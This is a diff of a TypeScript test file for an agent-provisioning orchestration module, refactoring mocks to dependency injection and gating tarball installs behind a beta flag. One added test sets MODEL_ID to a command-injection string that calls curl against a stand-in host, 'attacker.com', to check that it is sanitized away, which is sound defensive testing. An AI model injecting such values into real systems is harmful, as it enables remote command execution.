@@ -5,30 +5,24 @@
  * handles optional hooks (preProvision, configure, preLaunch), model selection,
  * and restart loop wrapping for non-local clouds.
  *
- * IMPORTANT: We only mock ../shared/oauth (not ../shared/agent-setup or
- * ../shared/ui) because Bun's mock.module is process-global and would
- * bleed into with-retry-result.test.ts which tests the real wrapSshCall.
+ * Uses dependency injection (OrchestrationOptions.getApiKey) instead of
+ * mock.module to avoid process-global mock pollution.
  */
 
 import { afterEach, beforeEach, describe, expect, it, mock, spyOn } from "bun:test";
 import { mkdirSync, rmSync } from "node:fs";
 import { join } from "node:path";
+import { asyncTryCatch, tryCatch } from "@openrouter/spawn-shared";
 import { isNumber } from "../shared/type-guards.js";
-
-// ── Mock oauth + tarball (needed to avoid interactive prompts / network) ──
 
 const mockGetOrPromptApiKey = mock(() => Promise.resolve("sk-or-v1-test-key"));
 
-mock.module("../shared/oauth", () => ({
-  getOrPromptApiKey: mockGetOrPromptApiKey,
-}));
-
 // ── Import the real module under test ─────────────────────────────────────
-
-const { runOrchestration } = await import("../shared/orchestrate");
 
 import type { AgentConfig } from "../shared/agents";
 import type { CloudOrchestrator, OrchestrationOptions } from "../shared/orchestrate";
+
+import { runOrchestration } from "../shared/orchestrate";
 
 const mockTryTarballInstall = mock(() => Promise.resolve(false));
 
@@ -74,9 +68,10 @@ function createMockAgent(overrides: Partial<AgentConfig> = {}): AgentConfig {
   };
 }
 
-/** Default options that inject the mock tarball function. */
+/** Default options that inject mock dependencies via DI. */
 const defaultOpts: OrchestrationOptions = {
   tryTarball: mockTryTarballInstall,
+  getApiKey: mockGetOrPromptApiKey,
 };
 
 /** Run orchestration and catch the process.exit throw. */
@@ -86,14 +81,13 @@ async function runOrchestrationSafe(
   agentName: string,
   opts: OrchestrationOptions = defaultOpts,
 ): Promise<void> {
-  try {
-    await runOrchestration(cloud, agent, agentName, opts);
-  } catch (e) {
+  const r = await asyncTryCatch(async () => runOrchestration(cloud, agent, agentName, opts));
+  if (!r.ok) {
     // process.exit mock throws to stop execution — that's expected
-    if (e instanceof Error && e.message.startsWith("__EXIT_")) {
+    if (r.error.message.startsWith("__EXIT_")) {
       return;
     }
-    throw e;
+    throw r.error;
   }
 }
 
@@ -117,6 +111,9 @@ describe("runOrchestration", () => {
     process.env.SPAWN_HOME = testDir;
     // Skip GitHub auth prompts during tests
     process.env.SPAWN_SKIP_GITHUB_AUTH = "1";
+    // Ensure no stale env leaks between tests
+    delete process.env.SPAWN_ENABLED_STEPS;
+    delete process.env.SPAWN_BETA;
     stderrSpy = spyOn(process.stderr, "write").mockImplementation(() => true);
     exitSpy = spyOn(process, "exit").mockImplementation((code) => {
       capturedExitCode = isNumber(code) ? code : 0;
@@ -134,14 +131,12 @@ describe("runOrchestration", () => {
     } else {
       delete process.env.SPAWN_HOME;
     }
-    try {
+    tryCatch(() =>
       rmSync(testDir, {
         recursive: true,
         force: true,
-      });
-    } catch {
-      // best-effort cleanup
-    }
+      }),
+    );
   });
 
   it("calls all cloud lifecycle methods in correct order", async () => {
@@ -326,7 +321,7 @@ describe("runOrchestration", () => {
 
     await runOrchestrationSafe(cloud, agent, "testagent");
 
-    expect(configure).toHaveBeenCalledWith("sk-or-v1-test-key", "anthropic/claude-3");
+    expect(configure).toHaveBeenCalledWith("sk-or-v1-test-key", "anthropic/claude-3", undefined);
     stderrSpy.mockRestore();
     exitSpy.mockRestore();
   });
@@ -342,7 +337,7 @@ describe("runOrchestration", () => {
 
     await runOrchestrationSafe(cloud, agent, "testagent");
 
-    expect(configure).toHaveBeenCalledWith("sk-or-v1-test-key", "google/gemini-pro");
+    expect(configure).toHaveBeenCalledWith("sk-or-v1-test-key", "google/gemini-pro", undefined);
     process.env.MODEL_ID = originalModelId;
     stderrSpy.mockRestore();
     exitSpy.mockRestore();
@@ -359,7 +354,25 @@ describe("runOrchestration", () => {
 
     await runOrchestrationSafe(cloud, agent, "testagent");
 
-    expect(configure).toHaveBeenCalledWith("sk-or-v1-test-key", undefined);
+    expect(configure).toHaveBeenCalledWith("sk-or-v1-test-key", undefined, undefined);
+    process.env.MODEL_ID = originalModelId;
+    stderrSpy.mockRestore();
+    exitSpy.mockRestore();
+  });
+
+  it("rejects MODEL_ID with shell metacharacters", async () => {
+    const originalModelId = process.env.MODEL_ID;
+    process.env.MODEL_ID = '"; curl attacker.com; "';
+    const configure = mock(() => Promise.resolve());
+    const cloud = createMockCloud();
+    const agent = createMockAgent({
+      configure,
+    });
+
+    await runOrchestrationSafe(cloud, agent, "testagent");
+
+    // Invalid model ID should be sanitized to undefined
+    expect(configure).toHaveBeenCalledWith("sk-or-v1-test-key", undefined, undefined);
     process.env.MODEL_ID = originalModelId;
     stderrSpy.mockRestore();
     exitSpy.mockRestore();
@@ -504,7 +517,8 @@ describe("runOrchestration", () => {
 
   // ── Tarball install ──────────────────────────────────────────────────
 
-  it("attempts tarball install before agent.install on non-local clouds", async () => {
+  it("attempts tarball install when --beta=tarball is set on non-local clouds", async () => {
+    process.env.SPAWN_BETA = "tarball";
     const install = mock(() => Promise.resolve());
     const cloud = createMockCloud({
       cloudName: "digitalocean",
@@ -523,7 +537,25 @@ describe("runOrchestration", () => {
     exitSpy.mockRestore();
   });
 
+  it("skips tarball install by default (no --beta flag)", async () => {
+    const install = mock(() => Promise.resolve());
+    const cloud = createMockCloud({
+      cloudName: "digitalocean",
+    });
+    const agent = createMockAgent({
+      install,
+    });
+
+    await runOrchestrationSafe(cloud, agent, "testagent");
+
+    expect(mockTryTarballInstall).not.toHaveBeenCalled();
+    expect(install).toHaveBeenCalledTimes(1);
+    stderrSpy.mockRestore();
+    exitSpy.mockRestore();
+  });
+
   it("skips agent.install when tarball succeeds", async () => {
+    process.env.SPAWN_BETA = "tarball";
     mockTryTarballInstall.mockImplementation(() => Promise.resolve(true));
     const install = mock(() => Promise.resolve());
     const cloud = createMockCloud({
@@ -541,7 +573,8 @@ describe("runOrchestration", () => {
     exitSpy.mockRestore();
   });
 
-  it("skips tarball install for local cloud", async () => {
+  it("skips tarball install for local cloud even with --beta=tarball", async () => {
+    process.env.SPAWN_BETA = "tarball";
     const install = mock(() => Promise.resolve());
     const cloud = createMockCloud({
       cloudName: "local",
@@ -559,6 +592,7 @@ describe("runOrchestration", () => {
   });
 
   it("skips tarball install when agent has skipTarball set", async () => {
+    process.env.SPAWN_BETA = "tarball";
     const install = mock(() => Promise.resolve());
     const cloud = createMockCloud({
       cloudName: "digitalocean",
